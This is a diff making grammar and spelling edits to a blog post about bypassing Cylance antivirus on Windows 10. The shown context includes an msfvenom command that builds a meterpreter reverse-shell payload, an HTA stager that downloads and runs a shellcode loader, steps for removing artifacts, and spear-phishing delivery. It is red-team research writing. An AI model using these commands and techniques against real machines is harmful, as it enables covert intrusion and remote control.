@@ -29,9 +29,9 @@ This is not one of those impractical posts showing the results of a VirusTotal s
 Before we begin I want to make it clear that I was neither employed by any company nor paid by an individual to perform these tests. All of this was done on personal interest and curiosity just to confirm whether I could.
 
 ## Preparing the test environment
-Of course we would need to set up a test environment to run the scenario. Here are the things you'd need:
+Of course, we would need to set up a test environment to run the scenario. Here are the things you'd need:
 
-1. A latest version of Windows 10 build with all security hotfixes installed - This is going to be our target machine.
+1. The latest version of Windows 10 build with all security hotfixes installed - This is going to be our target machine.
 1. A Linux box loaded with Metasploit framework - The attacker machine.
 1. A copy of Cylance Smart AV with all features enabled - You may get a "trial" version for a month(5 USD).
 
@@ -58,7 +58,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=8080 -f c
 
 Take care to change the `LHOST` to your Linux machine's local IP and `LPORT` if you desire so.
 
-Let's move on to creating the shellcode loader now but before that you'd need to install  MinGW cross-compiler on the Linux box to compile the following C code to a Windows executable and you can do so via:
+Let's move on to creating the shellcode loader now but before that, you'd need to install  MinGW cross-compiler on the Linux box to compile the following C code to a Windows executable and you can do so via:
 
 ```
 apt-get install mingw-w64
@@ -135,12 +135,12 @@ Many of you might be even wondering why am I using a _meterpreter_ payload at al
 
 This attack may also be done with Cobalt Strike and its _beacon_ payload.
 ### Creating the Payload Stager
-Okay you have created the payload but now what? 
+Okay, you have created the payload but now what? 
 
-You can't just give an EXE to a target and hope for him/her to double-click on it right?
+You can't just give an EXE to a target and hope for him/her to double-click on it, right?
 Maybe that would have worked five-six decades ago but sure as hell no one's double-clicking on an unsigned, shady, standalone EXE payload without a compelling reason these days.
 
-Well what about an HTML Application or HTA? 
+Well, what about an HTML Application or HTA? 
 
 Quoting _nccgroup_ [link](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/),
 
@@ -152,11 +152,11 @@ However, the difference with HTA files is that they run in full trust mode, with
 This means that if an attacker was to serve a HTA file (for example, via a malicious webpage) and convince the user to click through two warnings, then the attacker could run malicious code on the victim's computer. All without needing an exploit or bypassing any of the latest and greatest mitigations.
 ```
 
-So HTA files are not subject to the same stringent restrictions as HTML pages. What's more you can even use embedded JS or VBS code with ActiveX Object support such as `WScript.Shell`. This means you can potentially use an HTA to perform some malicious activity on the executing host machine. Sounds intriguing...
+So HTA files are not subject to the same stringent restrictions as HTML pages. What's more, you can even use embedded JS or VBS code with ActiveX Object support such as `WScript.Shell`. This means you can potentially use an HTA to perform some malicious activity on the executing host machine. Sounds intriguing...
 
-So why don't we create an HTA that will download and execute our payload when it is run? In other words a stager which upon being run will download and execute our shellcode loader program which in turn will execute our final _meterpreter_ shellcode. Let's do that!
+So why don't we create an HTA that will download and execute our payload when it is run? In other words, a stager which upon being run will download and execute our shellcode loader program which in turn will execute our final _meterpreter_ shellcode. Let's do that!
 
-Keep in mind that HTML Applicatons are executed using `mshta.exe`.
+Keep in mind that HTML Applications are executed using `mshta.exe`.
 
 Here is the HTA source:
 
@@ -233,15 +233,15 @@ Change the Timing parameters factoring into account the payload size, connectivi
 
 In case you are wondering, yes this does drop **two** files on disk namely the Base64 encoded loader binary and the PE executable after converting it in the Microsoft Edge `TempState/Downloads` folder considering that you are using the default browser.
 
-This is the reason the script is timed to cleanup after itself and delete the Base64 downloaded file and the HTA file from disk and close the `mshta.exe` process after a set time(60 seconds after execution). Note that you can't delete the payload binary on disk as it's a running process but a possible workaround could be to inject the _meterpreter_ code to another suitable, running Windows process once you get the shell and then attempt to delete the original payload binary. That way there shall be no artifacts to recover.
+This is the reason the script is timed to clean up after itself and delete the Base64 downloaded file and the HTA file from disk and close the `mshta.exe` process after a set time(60 seconds after execution). Note that you can't delete the payload binary on disk as it's a running process but a possible workaround could be to inject the _meterpreter_ code to another suitable, running Windows process once you get the shell and then attempt to delete the original payload binary. That way there shall be no artifacts to recover.
 
 I know what you are thinking, that I could have used a _Powershell_ payload for a file-less attack and avoided dropping to disks altogether. While _Powershell_ happened to be a very powerful tool in the arsenal of red-teamers in the past, it's slowly losing it's potential thanks to the extensive logging employed and various protection mechanisms implemented by Microsoft these days.
 
-Another option as you might know is to launch the shellcode via JS/VBS shellcode launcher embedded in HTA eliminating the use of the loader binary. I haven't really experimented with it but you can do so via this wonderful tool: [https://github.com/mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
+Another option, as you might know, is to launch the shellcode via JS/VBS shellcode launcher embedded in HTA eliminating the use of the loader binary. I haven't really experimented with it but you can do so via this wonderful tool: [https://github.com/mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
 
-Also, feel free to explore the myriad sea of oppurtunities using MS Office phishing techniques like _VBA Macros(pretty much dead!), DDE, XLM(Macro 4.0), SYLK(Excel) etc._
+Also, feel free to explore the myriad sea of opportunities using MS Office phishing techniques like _VBA Macros(pretty much dead!), DDE, XLM(Macro 4.0), SYLK(Excel) etc._
 
-Okay so now that we have prepared the HTA, how are we going to serve it to the victim in a secure manner?
+Okay so now that we have prepared the HTA, how are we going to serve it to the victim?
 
 I made use of another lovely tool developed by [@Arno0x0x](https://twitter.com/Arno0x0x) called [EmbedInHTML](https://github.com/Arno0x/EmbedInHTML). 
 
@@ -264,7 +264,7 @@ Setting this up was relatively an easy task using:
 Great! Now all the target needs to do is visit this webpage hosted somewhere and click through a warning to run the HTA and that's all.
 
 ## Phase 3 of Kill Chain - Delivery
-This is the step where you would host the malicious webpage(created in the previous step ) somewhere and send spear-phishing mails to the target with an appropiate target-specific lure with links to the webpage.
+This is the step where you would host the malicious webpage to serve the HTA stager(created in the previous step) somewhere and send spear-phishing emails to the target with an appropriate target-specific lure with links to the webpage.
 
 For the purposes of this blog-post, I am self-hosting it on my Linux box using:
 
